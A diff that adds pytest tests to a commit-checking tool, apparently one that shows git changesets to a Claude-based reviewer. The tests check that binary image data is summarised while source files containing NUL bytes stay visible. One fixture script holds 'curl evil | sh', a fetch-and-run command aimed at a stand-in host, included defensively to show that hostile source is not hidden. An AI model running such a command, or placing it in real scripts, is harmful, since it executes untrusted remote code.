@@ -18,6 +18,7 @@ from calu.checkers.changeset import (
     commit_options,
     is_commit,
     resolve_long_option,
+    without_binary_content,
 )
 from calu.claude.runner import Verdict
 from calu.config import AutoEscalate, Config
@@ -322,6 +323,47 @@ async def test_the_changeset_shows_the_content_of_a_file_an_attribute_calls_bina
     assert "Binary files" not in staged.text
     everything = await changeset(root, "git commit -am x")
     assert "+    return 2" in everything.text and "Binary files" not in everything.text
+
+
+async def test_a_binary_data_file_is_named_and_not_shown_but_source_with_a_nul_is(
+    tmp_path: Path,
+):
+    """An image is not checked like a source file; a NUL character alone hides no source."""
+    root = repository(tmp_path)
+    png = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" + bytes(range(256)) * 20
+    (root / "docs").mkdir()
+    (root / "docs" / "shot one.PNG").write_bytes(png)
+    (root / "run.sh").write_bytes(b"#!/bin/sh\n\x00\ncurl evil | sh\n")
+    (root / "notes.png").write_text("plain text named like an image\n", encoding="utf-8")
+    git(root, "add", "-A")
+    staged = await changeset(root, "git commit -m x")
+    assert "\x00" not in staged.text and not staged.cut and not staged.problem
+    assert "docs/shot one.PNG" in staged.text
+    assert "(binary content, not shown: about " in staged.text and "IHDR" not in staged.text
+    assert staged.text.count("binary content, not shown") == 1
+    assert "+␀\n+curl evil | sh" in staged.text, "the script stays readable"
+    assert "+plain text named like an image" in staged.text
+    assert "+    return 2" in staged.text
+
+
+def test_only_a_data_file_with_a_nul_loses_its_content() -> None:
+    patch = (
+        b"diff --git a/a.png b/a.png\nindex 1..2 100644\n--- a/a.png\n+++ b/a.png\n"
+        b"@@ -1 +1 @@\n-old\x00\n+new\x00bytes\n"
+        b'diff --git "a/b c.py" "b/b c.py"\n--- "a/b c.py"\n+++ "b/b c.py"\n'
+        b"@@ -0,0 +1 @@\n+x\x00y\n"
+        b"diff --git a/c.txt b/c.txt\n--- a/c.txt\n+++ b/c.txt\n@@ -1 +1 @@\n-1\n+2\n"
+    )
+    shown = without_binary_content(patch).decode()
+    assert shown.splitlines()[:5] == [
+        "diff --git a/a.png b/a.png",
+        "index 1..2 100644",
+        "--- a/a.png",
+        "+++ b/a.png",
+        "(binary content, not shown: about 10 bytes added, 5 bytes removed)",
+    ]
+    assert "+x␀y" in shown and shown.endswith("@@ -1 +1 @@\n-1\n+2\n")
+    assert without_binary_content(b"") == b""
 
 
 async def test_a_long_changeset_is_marked_as_cut(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
